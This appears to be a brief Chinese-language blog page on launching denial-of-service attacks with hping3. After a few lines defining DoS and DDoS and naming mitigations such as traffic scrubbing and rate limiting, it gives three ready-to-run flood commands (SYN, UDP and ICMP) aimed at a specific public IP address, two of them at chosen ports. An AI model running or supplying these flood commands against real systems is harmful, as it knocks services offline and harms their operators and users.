---
layout: default
title: 使用hping3进行dos攻击
---



# dos攻击是啥？

> * dos 攻击 deny of service <mark>拒绝服务攻击</mark>，就是给你干崩溃
> 
> * <mark>ddos</mark> distributed dos攻击 <mark>分布式拒绝服务攻击</mark>，找很多人干你崩溃
> 
> * 无法根治
> 
> * ai设备进行<mark>数据清洗</mark>，搞掉部分攻击流量
> 
> * 服务器<mark>限流</mark>，不至于被打崩溃，但业务依然被干扰

# syn泛洪攻击

```bash
hping3 --syn --flood 112.125.18.22 -p 3389
```

# udp防洪攻击

```bash
hping3 --udp --flood 112.125.18.22 -p 1100
```

# icmp泛洪攻击

```bash
hping3 --icmp --flood 112.125.18.22
```




